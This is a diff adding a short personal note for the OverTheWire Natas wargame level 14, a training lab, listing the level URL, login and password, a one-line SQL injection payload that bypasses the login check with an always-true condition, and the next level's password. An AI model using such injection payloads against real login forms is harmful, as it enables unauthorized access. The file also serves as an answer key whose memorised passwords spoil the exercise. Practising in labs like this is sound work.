@@ -1,0 +1,10 @@
+URL: http://natas14.natas.labs.overthewire.org
+username: natas14
+password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+Sql injection
+Imput not filtered so provide
+name" or 1=1; #
+'#' is used to comment the rest of the query
+
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
